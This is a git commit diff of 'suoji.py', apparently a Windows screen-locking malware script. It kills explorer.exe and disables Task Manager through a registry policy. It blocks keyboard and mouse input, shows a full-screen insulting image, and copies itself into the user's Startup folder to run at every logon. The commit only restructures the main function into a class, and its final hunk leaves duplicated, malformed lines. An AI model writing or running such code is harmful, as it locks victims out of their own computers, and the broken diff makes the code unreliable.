7fbd3a0012f9e61e00dc6a2dda99a8c72ba21ea7
him technology <130269588+him114514@users.noreply.github.com>
2023-04-29 20:32:49 +0800

    Update suoji.py

--- suoji.py
+++ suoji.py
@@ -5,16 +5,17 @@ import win32con
 from ctypes import *
 filename=sys.argv[0]
 file1=r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\{1}\Programs\Startup".format(os.getlogin(),'Start Menu')
-def main():
-    os.system('taskkill /f /im explorer.exe & REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
-    ok = windll.user32.BlockInput(True)
-    import cv2
-    img = cv2.imread(r"C:\Windows\nmsl.png")     
-    out_win = "output_style_full_screen"
-    cv2.namedWindow(out_win, cv2.WINDOW_NORMAL)
-    cv2.setWindowProperty(out_win, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
-    cv2.imshow(out_win, img)
-    cv2.waitKey(0) 
+class main:
+    def start(self):
+        os.system('taskkill /f /im explorer.exe & REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
+        ok = windll.user32.BlockInput(True)
+        import cv2
+        img = cv2.imread(r"C:\Windows\nmsl.png")     
+        out_win = "output_style_full_screen"
+        cv2.namedWindow(out_win, cv2.WINDOW_NORMAL)
+        cv2.setWindowProperty(out_win, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
+        cv2.imshow(out_win, img)
+        cv2.waitKey(0) 
 if os.getcwd()!=file1 :
     if 'nmsl.png' not in os.listdir('C:\Windows'):
         try:
@@ -28,6 +29,11 @@ if os.getcwd()!=file1 :
     with open(filename,'rb') as f:
         read=f.read()
         with open(file1+r'\suoji.exe','wb') as f2:
+            f2.write(read)        
+    main().start()       
+else:
+    main().start()
+
             f2.write(read)        
     main()        
 else:
